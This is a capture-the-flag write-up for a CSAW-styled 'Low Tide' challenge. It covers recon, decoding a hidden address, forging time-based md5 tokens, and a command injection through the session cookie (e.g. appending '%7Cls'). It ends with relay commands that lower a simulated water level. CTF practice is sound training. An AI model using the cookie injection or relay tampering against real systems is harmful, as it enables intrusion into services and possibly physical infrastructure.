# Low Tide, full writeup

Two separate addresses.

    low-tide.ctf.csaw.io       the static recon page, no backend
    low-tide-lb.ctf.csaw.io    the real load balancer, everything happens here

Only the second one answers `/station/checkin`. The first one only serves static files and returns 405 on POST.

---

## Phase 0, recon

### What this phase actually is

The static page pretends to check whether a water system is online. That check never really runs from a browser, on purpose. What matters is the source code behind it, which hides the real address and the header needed to talk to it.

### robots.txt

```
curl -si https://low-tide.ctf.csaw.io/robots.txt
```

`-s` hides the progress bar. `-i` includes the response headers, not just the body, worth keeping since headers sometimes carry useful
information too.

Response:
```
User-agent: *
Disallow: /internal-monitor/
Disallow: /relay-status/
# StationSync-Agent/2.1
# FieldSync-Client/3.0
# MonitorAgent/2.2
# StationSync-Agent/2.0
# RelayCheck-Bot/1.9
```

One of these is the header the load balancer actually requires; the rest are decoys. Confirming which one is real means testing it directly against the load balancer, as covered in phase 1.

### app.js

```
curl -si https://low-tide.ctf.csaw.io/assets/app.js
```

The response includes a line that does not look like normal code: a string of letters and numbers separated by spaces. This is wrapped in three layers, one inside another.

Layer one, rot47. Every printable character shifts forward 47 places within a fixed range. Applying the same shift a second time undoes it, so the same function encodes and decodes.

Layer two, hex. Standard two-digit pairs; each pair is one character.

Layer three, base64. Standard encoding, decodes to the real address.


### style.css

```
curl -si https://low-tide.ctf.csaw.io/assets/style.css
```

Contains a comment mentioning .htaccess. That file does not exist; requesting it returns a 404. This comment does not lead anywhere; it exists as noise.

### What phase 0 hands you

The real load balancer address, and the required header value, both recovered by decoding, not guessed.

---

## Phase 1, the login

### The mechanism

The load balancer sits in front of four separate backend stations. Every session gets assigned to one of the four at random. Each
station runs on its own clock and is set to a different year. Access is proven by reading that station's current time from a response, and answering with a value calculated from it, within a short window before the time moves on.

### First request

```
curl -si -c cookies.txt -X POST https://low-tide-lb.ctf.csaw.io/station/checkin \
  -H "User-Agent: StationSync-Agent/2.1" \
  -d "action=checkin"
```

-c cookies.txt tells curl to save any cookies the server sets into a file, so later requests can reuse the same session. -X POST sets the method. -H adds the required header. 
-d sends form data as the body.

Response:
```json
{"result":"up","sid":"unassigned"}
```
Headers include Set-Cookie: sid=... That sid value is the session's real identity; everything after this point depends on it.

### Second request, read the clock

```
curl -si -c cookies.txt -b cookies.txt -X POST https://low-tide-lb.ctf.csaw.io/station/checkin \
  -H "User-Agent: StationSync-Agent/2.1" \
  -d "action=checkin&token=x"
```

-b cookies.txt sends the cookie back, keeping the same session.
token=x is deliberately wrong, sent only to see what the server
says back.

Response:
```json
{"reason":"code_mismatch: expected token derived from current sync time","result":"rejected","sync_time":"2016-08-20T14:04:16Z"}
```

sync_time is the station's own current time, according to its own clock, not the real time.

### The real token

```
token = md5(sid + epoch_seconds_of_sync_time)
```

Convert sync_time to epoch seconds, concatenate it with the sid string, and hash it. Do this right before sending; the answer is only valid for a few seconds.

### Third request

```
curl -si -c cookies.txt -b cookies.txt -X POST https://low-tide-lb.ctf.csaw.io/station/checkin \
  -H "User-Agent: StationSync-Agent/2.1" \
  -d "action=checkin&token=<the calculated token>"
```

Correct answer:
```json
{"directory_api":"/api/v1/st-02/","result":"accepted","role":"system_check","station_id":"st-02"}
```

station_id tells you which of the four stations you landed on. Every request from here needs a fresh token, same formula, but using station_id in place of sid.

Note on directory_api: the value shown is a fragment, not a complete usable path on its own. The working path always needs /station/checkin in front of it, covered next.

### Why this sometimes seems to fail

Four wrong tokens in a row on one station move the session to a different station. All four wrong attempts lock everything for a short cooldown. This counts every wrong attempt, including ones made just to read the clock, so careful, correct exploration can still trigger it.

---

## Phase 2, exploring the files, two separate paths

### Path A, the official file API

This always works, on any station, no guessing needed.

```
GET /station/checkin/api/v1/<station_id>/<path>
```

Listing the root:
```
curl -s -X POST https://low-tide-lb.ctf.csaw.io/station/checkin/api/v1/st-02/ \
  -H "User-Agent: StationSync-Agent/2.1" \
  --cookie "sid=<sid>" \
  -d "action=checkin&token=<fresh token>"
```

Response:
```json
{"entries":["station.log","config/"],"type":"directory"}
```

Reading station.log:
```json
{"content":"[st-02] routine check-in ok\n[st-02] heartbeat nominal\n[st-02] disk usage 34%\n[st-02] cron: backup job completed\n[st-02] WARN: stale handler dump written to .logs/err_3005.log\n[st-02] heartbeat nominal\n","type":"file"}
```

That WARN line names a path never shown in any listing: .logs/err_3005.log. Reading it directly works anyway:
```json
{"content":"chat bridge relocated: config/relay_chat.js\n","type":"file"}
```

config/relay-bot.js returns base64, decoded it reads:
```
// integration failed
// see error 3005 in logs
// token rotation broke auth
```

config/relay_chat.js:
```
// chat bridge moved here after the v1 migration
// endpoint: v2/chat
// see sync.conf for the auth handshake, never finished porting it over
```

config/sync.conf:
```
chat bridge auth: Authorization: Bot <token>
token=md5(station_id+MMM+DD+YY+HH+MM) all lowercase/zero-padded
params: id=<message id, batch of 5>
```

That is the whole chain, one file naming the next, ending with the exact formula needed for phase 3.

### Path B, the piggyback shortcut

### How to spot it

Reviewing the session cookie itself. That is the hint, not something written anywhere in the files- a gap in how carefully a real system might handle its own session values.

### How it works

Appending a short piece of text onto the end of the sid value, then sending that combined string as the cookie, gets read by the station as a command instead of being treated as part of the session id. Each station is different, this part is not documented anywhere, it has to be discovered per station.

```
station 1    add a space, URL-encoded as %20
station 2    add a plus sign, %2B
station 3    add a tab, %09
station 4    add a pipe character, %7C
```

Followed by ls to list, or cat to read a specific file.

### Example, station 4

```
curl -si -X POST https://low-tide-lb.ctf.csaw.io/station/checkin \
  -H "User-Agent: StationSync-Agent/2.1" \
  --cookie "sid=<sid>%7Cls" \
  -d "action=checkin&token=<fresh token>"
```

Response:
```json
{"debug":["station.log","config/"],"directory_api":"/api/v1/st-04/","result":"accepted","role":"system_check","station_id":"st-04"}
```

The debug field appearing is the confirmation, that is the same listing path A reaches, just through the shortcut. Wrong separator
on the wrong station returns the normal accepted response with no debug field at all, no error, no hint that it was close.

### Why both paths exist

Path A, no guessing, is normal on every station.
Path B is faster once you know the right divider for that station, but it costs time to discover. Both reach identical content.

---

## Phase 3, the chat log

### The mechanism

A separate system entirely from the file API, styled after real bot platform APIs. Authentication uses a header instead of a body token, and the token formula is different: it uses the minute instead of the second, so it stays valid longer.

```
identity = station_id + month_abbrev + day + year_2digit + hour24 + minute
(all lowercase, all zero padded)
chat_token = md5(identity)
```

### Request

```
curl -s -X GET "https://low-tide-lb.ctf.csaw.io/station/checkin/api/v2/chat?id=1" \
  -H "User-Agent: StationSync-Agent/2.1" \
  -H "Authorization: Bot <chat_token>" \
  --cookie "sid=<sid>"
```

Response:
```json
{"messages":[{"id":1,"from":"dev_marcus","text":"morning, anyone else's VPN acting up today"}]}
```

Messages come five at a time, starting at whatever id is requested.
No auth header at all returns:
```json
{"reason":"unauthorized","result":"rejected"}
```

### Finding the payoff

Paging through with id=6, id=11, and eventually reaching messages 53 through 57, you get an address and a key for a separate, private system, along with a direct statement that only one station can reach it.

---

## Phase 4, getting onto the right station

Only station 4 can use what the chat revealed. Landing there is not guaranteed on the first login, since assignment is random. The practical approach is to start fresh sessions and check station_id on each one, rather than exhausting the rotation limit in a single session while trying to force a change.

---

## Phase 5, the relay and the flag

```
curl -si -X POST https://low-tide-lb.ctf.csaw.io/station/checkin/relay \
  -H "User-Agent: StationSync-Agent/2.1" \
  -H "X-Relay-Target: <address from the chat>" \
  -H "X-Relay-Key: <key from the chat>" \
  --cookie "sid=<sid, must be on station 4>" \
  -d "action=checkin&token=<fresh token>&cmd=CMD:WATER:LOWER:20"
```

This controls a simulated water level, starting at 70. Commands accept RAISE or LOWER with an amount. Response shows the new level:

```json
{"relay":{"status":"ok","water_level":50}}
```

Landing exactly on 20 returns the flag in the same response.


> "Brute force is the last resort of the incompetent." — MIT
